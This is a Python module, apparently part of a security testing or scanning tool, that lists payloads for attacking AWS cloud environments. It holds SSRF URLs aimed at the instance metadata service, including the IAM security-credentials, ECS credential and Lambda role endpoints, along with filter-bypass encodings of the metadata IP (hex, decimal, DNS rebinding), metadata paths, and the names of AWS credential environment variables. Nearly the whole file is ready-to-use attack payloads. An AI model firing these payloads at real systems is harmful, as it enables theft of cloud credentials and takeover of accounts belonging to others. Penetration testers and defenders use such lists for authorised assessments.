"""aws.py — AWS Cloud Environment Payloads"""

# ─────────────────────────────────────────────
# SSRF → AWS Metadata Service
# ─────────────────────────────────────────────
AWS_SSRF_PAYLOADS: list[str] = [
    # IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/instance-type",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # IMDSv2 (requires token first — for detection, try v1 path)
    "http://169.254.169.254/latest/api/token",
    # Encoded bypass
    "http://169.254.169.254/latest/meta-data/",
    "http://0xA9FEA9FE/latest/meta-data/",  # Hex IP
    "http://2852039166/latest/meta-data/",  # Decimal IP
    "http://169.254.169.254.nip.io/latest/meta-data/",  # DNS rebind
    # ECS metadata
    "http://169.254.170.2/v2/credentials",
    "http://169.254.170.2/v2/credentials/",
    # Lambda env
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role",
]

AWS_METADATA_PATHS: list[str] = [
    "/latest/meta-data/",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/hostname",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/iam/info",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/instance-type",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/placement/availability-zone",
    "/latest/user-data/",
    "/latest/dynamic/instance-identity/document",
    "/latest/meta-data/network/interfaces/macs/",
    "/latest/meta-data/network/interfaces/macs/{mac}/",
    "/latest/meta-data/network/interfaces/macs/{mac}/vpc-id",
    "/latest/meta-data/network/interfaces/macs/{mac}/subnet-id",
]

# ─────────────────────────────────────────────
# AWS Environment Variable patterns
# ─────────────────────────────────────────────
AWS_ENV_VARS: list[str] = [
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AWS_DEFAULT_REGION",
    "AWS_REGION",
    "AWS_ACCOUNT_ID",
    "AWS_LAMBDA_FUNCTION_NAME",
    "AWS_EXECUTION_ENV",
    "AWS_LAMBDA_RUNTIME_API",
    "LAMBDA_RUNTIME_DIR",
    "LAMBDA_TASK_ROOT",
    "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
    "AWS_CONTAINER_CREDENTIALS_FULL_URI",
    "AWS_CONTAINER_AUTHORIZATION_TOKEN",
    "ECS_CONTAINER_METADATA_URI",
    "ECS_CONTAINER_METADATA_URI_V4",
    "AWS_WEB_IDENTITY_TOKEN_FILE",
    "AWS_ROLE_ARN",
]
